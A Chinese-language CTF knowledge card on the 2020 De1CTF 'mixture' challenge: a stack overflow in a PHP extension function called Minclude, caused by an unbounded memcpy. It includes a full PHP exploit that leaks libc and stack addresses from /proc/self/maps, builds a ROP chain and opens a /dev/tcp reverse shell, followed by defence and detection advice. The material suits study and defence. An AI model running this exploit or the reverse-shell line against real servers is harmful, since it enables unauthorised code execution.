---
id: ctf-pwn-php-extension-minclude-stack-overflow-maps-rop
title: PHP 扩展 Minclude 无长度限制 memcpy 栈溢出：/proc/self/maps 泄 libc/栈后 ROP 反弹 shell（2020 De1CTF mixture）
type: scenario
domain: ctf
path: ctf/pwn
technique: php-extension-minclude-memcpy-stack-overflow-maps-rop
aliases:
- De1CTF mixture
- PHP 扩展栈溢出
- Minclude 任意文件读取
- /proc/self/maps 泄露 libc
- PHP pwn ret2libc
tags:
- ctf
- pwn
- php
- php-extension
- stack-overflow
- ret2libc
- proc-self-maps
- rop
- libc-2.27
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:39:43+08:00'
  notes: 已对照原文与全部12张图核对：zif_Minclude源码memcpy(a,arg,n)无长度限制、fopen/fgetc读文件（图07）；exp用ob_start+Minclude(/proc/self/maps)提取libc-2.27与[stack]、0x88填充、0x215bf/0x23eea/0x80a10偏移、反弹shell，与原文一致。图05/06为扩展加载与调试断点。未验证点：未运行exp；原文未给完整libc文件，偏移需按题目版本核对。
---

## 一句话结论

2020 De1CTF mixture 的自定义 PHP 扩展函数 `Minclude` 把 PHP 字符串参数直接 `memcpy` 进 0x60 字节栈缓冲区且不限制长度，构成栈溢出；由于同一函数还能读任意文件，用 `ob_start()` 包裹 `Minclude("/proc/self/maps")` 即可泄露 libc-2.27 与 `[stack]` 基址，随后以 0x88 偏移覆盖返回地址，用 libc 2.27 的 ROP 链调用 `system`/`execve` 执行栈内命令字符串，反弹 shell。

## 原理

- **危险 sink**：扩展里的 `PHP_FUNCTION(Minclude)` 编译后是 `zif_Minclude(zend_execute_data *execute_data, zval *return_value)`；它用 `zend_parse_parameters(..., "s", &arg, &n)` 取得路径指针和长度，再 `memcpy(a, arg, n)` 到栈上的 `char a[100]`（实际只 memset 0x60）。`n` 完全来自 PHP 字符串长度，没有与目标缓冲区大小比较。
- **二进制安全**：PHP 字符串可包含任意字节（包括 `\x00`），因此可以把含地址空字节的 ROP 链作为一个字符串传入扩展函数；HTTP 层由 exp.php 在服务端拼装，不经过表单编码限制。
- **任意文件读取**：同一函数用 `fopen(a,"rb")` + `fgetc` 循环把文件内容 `php_printf` 输出；`/proc/self/maps` 对当前 PHP/Apache 进程可读，里面同时有 `libc-2.27.so` 的映射起点和 `[stack]` 区间起点，分别给出 `libc_base` 与栈地址。
- **输出捕获**：`ob_start()` 开启输出缓冲，`Minclude("/proc/self/maps")` 的输出被 `ob_get_contents()` 收进字符串，再用正则提取 `([0-9a-f]+)-...libc-2.27.so` 和 `([0-9a-f]+)-...\[stack\]` 的首地址。
- **偏移与链**：原文 exp 用 0x88 字节填充覆盖到返回地址（该题栈帧无 canary，`a` 在 rbp-0x88 附近）；随后按题目 libc 2.27 的偏移放 gadget（原文 0x215bf、0x23eea、0x80a10），把栈上命令字符串地址作为参数，最终执行 `/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"`。
- **为什么成立**：扩展函数由用户态 PHP 脚本直接调用，参数长度和内容完全受控；栈缓冲区大小固定且没有长度校验，ASLR 又被 `/proc/self/maps` 在同一进程内泄露，因此一次请求即可从“读文件”升级为代码执行。

## 触发条件

- 目标 PHP 环境加载了存在无界 `memcpy` 的扩展（本例为自编译 `vuln.so`，注册 `Minclude`），且函数可被 PHP 脚本调用。
- 攻击者能执行 PHP 代码：CTF 中题目提供文件上传页，上传 `exp.php` 后访问 `url/exp.php`；真实场景对应已获得任意 PHP 代码执行（文件上传、包含、后台模板等）。
- 进程可读 `/proc/self/maps`（未受 `open_basedir`/`disable_functions` 限制；该题未限制）。
- 目标栈无 canary（或可先泄露），NX 开启需要 ROP；ASLR 开启但可经 maps 泄露。
- 需要与题目一致的 libc 版本（本例 libc-2.27）来确定 gadget/函数偏移。

## 利用步骤

1. 准备文件上传页/入口，把 exp.php 上传到 Web 根目录并访问 `http://<target>/exp.php`。
2. exp.php 内 `ob_start()` 后调用 `Minclude("/proc/self/maps")`，`ob_get_contents()` 取回 maps 文本，正则提取 `libc-2.27.so` 与 `[stack]` 的起始地址，得到 `libc_base`、`stack`。
3. 按题目栈帧计算偏移（原文 0x88），构造 `填充 + ROP 链 + 命令字符串` 的二进制字符串。
4. 再次调用 `Minclude($payload)`；`memcpy` 溢出覆盖返回地址，函数返回时进入 ROP，执行栈内命令字符串。
5. 在 `127.0.0.1:6666` 监听（原文在目标本机/跳板监听），拿反弹 shell 后读 flag。

## PoC

原文 exp 核心（偏移与 gadget 为该题 libc-2.27 专用，需按实际 libc 核对）：

```php
<?php
function s2i($s) {
    $result = 0;
    for ($x = 0; $x < strlen($s); $x++) { $result <<= 8; $result |= ord($s[$x]); }
    return $result;
}
function i2s($i, $x = 8) {
    $re = "";
    for ($j = 0; $j < $x; $j++) { $re .= chr($i & 0xff); $i >>= 8; }
    return $re;
}
function callback($buffer){
    global $libc, $stack;
    preg_match_all('/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/', $buffer, $libc);
    preg_match_all('/([0-9a-f]+)\-[0-9a-f]+ .*  \[stack\]/', $buffer, $stack);
    return "";
}
$command = '/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"';
ob_start();
$a = "/proc/self/maps";
Minclude($a);
$buffer = ob_get_contents();
ob_end_flush();
callback($buffer);
$stack = hexdec($stack[1][0]);
$libc_base = hexdec($libc[1][0]);

$payload = str_repeat("a", 0x88);
$payload .= i2s($libc_base + 0x215bf);
$payload .= i2s($stack + 0x1ca98 + 0x90) . i2s($libc_base + 0x23eea);
$payload .= i2s($stack + 0x1ca98 + 0x28) . i2s($libc_base + 0x80a10);
$payload .= "r" . str_repeat("\x00", 0x7) . str_repeat("c", 0x60);
$payload .= $command . str_repeat("b", 0x8);
Minclude($payload);
?>
```

要点：正则同时抓 libc 与 `[stack]`；`str_repeat("a",0x88)` 是到返回地址的偏移；最后的 `$command` 必须放在溢出字符串内，ROP 以栈地址引用它。

## 变体与关联

- **换 sink**：任意“扩展函数把 PHP 字符串拷贝到固定栈缓冲区”的实现都可用同一套 maps 泄露 + ROP；若目标有 canary，需要先用同类越界读/泄露函数读 canary。
- **换泄露源**：除 `/proc/self/maps` 外，`/proc/self/stat`、`/proc/self/environ`、扩展自身的错误输出也可作为地址/栈泄露面；`Minclude` 本质是任意文件读取，泄露面取决于可读文件。
- **调试配合**：本题远程调试需附加 Apache 的 php 进程并在 `vuln.so` 加载后按 `zif_Minclude` 下断，见 PHP 扩展远程调试卡。
- **同类题**：PHP 扩展 pwn 的另一大类是扩展内自定义堆结构导致的 UAF/off-by-null 任意写，见 D3CTF PwnShell 卡；两者分别代表栈与堆两条路径。

## 检测与防御

- 扩展代码审查：任何把 PHP 参数长度直接传给 `memcpy`/`memmove` 的地方都必须按目标缓冲区大小截断；用 `zend_parse_parameters` 的长度做上界检查，或改用 `snprintf`。
- 编译加固：扩展与 PHP 均开启 `-fstack-protector-strong`、`_FORTIFY_SOURCE`，可把这类无界拷贝变成可检测的崩溃；但 canary 不能阻止 maps 泄露，仍需修根因。
- 部署面：不要加载来源不明的 PHP 扩展；生产环境限制文件上传与脚本执行，启用 `open_basedir` 降低任意文件读取（会挡住 `/proc/self/maps` 泄露）。
- 检测：Web 目录出现新 PHP 文件、请求体含大量非打印字节/长二进制字符串、进程读取 `/proc/self/maps` 后立即外连，可作为可疑信号。
